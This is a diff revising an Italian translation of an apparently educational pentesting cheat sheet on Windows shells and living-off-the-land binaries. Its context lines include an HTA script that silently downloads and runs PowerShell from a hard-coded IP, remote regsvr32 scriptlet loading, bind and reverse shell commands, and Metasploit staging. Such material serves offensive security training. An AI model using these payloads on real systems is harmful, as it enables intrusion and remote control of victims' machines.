@@ -4,8 +4,8 @@
 
 ## Lolbas
 
-La pagina [lolbas-project.github.io](https://lolbas-project.github.io/) è per Windows come [https://gtfobins.github.io/](https://gtfobins.github.io/) è per Linux.\
-Ovviamente, **non ci sono file SUID o privilegi sudo in Windows**, ma è utile sapere **come** alcuni **binaries** possono essere (ab)usati per eseguire azioni inaspettate come **eseguire codice arbitrario.**
+La pagina [lolbas-project.github.io](https://lolbas-project.github.io/) è per Windows come [https://gtfobins.github.io/](https://gtfobins.github.io/) è per linux.\
+Ovviamente, **non ci sono file SUID o privilegi sudo in Windows**, ma è utile sapere **come** alcuni **binaries** possono essere (ab)usati per eseguire qualche tipo di azioni inaspettate come **eseguire codice arbitrario.**
 
 ## NC
 ```bash
@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) è un'alternativa portatile e sicura a Netcat**. Funziona su sistemi simili a Unix e Win32. Con funzionalità come crittografia forte, esecuzione di programmi, porte sorgente personalizzabili e riconnessione continua, sbd offre una soluzione versatile per la comunicazione TCP/IP. Per gli utenti Windows, la versione sbd.exe della distribuzione Kali Linux può essere utilizzata come sostituto affidabile di Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) è un'alternativa portatile e sicura a Netcat**. Funziona su sistemi simili a Unix e Win32. Con funzionalità come crittografia forte, esecuzione di programmi, porte sorgente personalizzabili e riconnessione continua, sbd offre una soluzione versatile per la comunicazione TCP/IP. Per gli utenti Windows, la versione sbd.exe dalla distribuzione Kali Linux può essere utilizzata come un sostituto affidabile di Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -87,7 +87,7 @@ Payload scritto su disco: **NO** (_almeno da nessuna parte che io possa trovare 
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Processo che esegue una chiamata di rete: **svchost.exe**\
-Payload scritto su disco: **Cache locale del client WebDAV**
+Payload scritto su disco: **WebDAV client local cache**
 
 **One liner:**
 ```bash
@@ -113,7 +113,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando l'hta stager**
+**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager hta**
 
 #### esempio hta
 
@@ -224,7 +224,7 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 #### Regsvr32 -sct
 
 [**Da qui**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-```markup
+```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
 <!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
@@ -249,7 +249,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic usando il stager regsvr**
+**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando il stager regsvr**
 
 ## Certutil
 
@@ -375,7 +375,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Nella cartella **Shells**, ci sono molte shell diverse. Per scaricare ed eseguire Invoke-_PowerShellTcp.ps1_, fai una copia dello script e aggiungi alla fine del file:
+Nella cartella **Shells**, ci sono molte shell diverse. Per scaricare ed eseguire Invoke-_PowerShellTcp.ps1_ fai una copia dello script e aggiungi alla fine del file:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -399,7 +399,7 @@ Defender non lo rileva come codice malevolo (ancora, 3/04/2019).
 
 **Altre opzioni offerte da powercat:**
 
-Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Genera payload, Serve file...
+Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
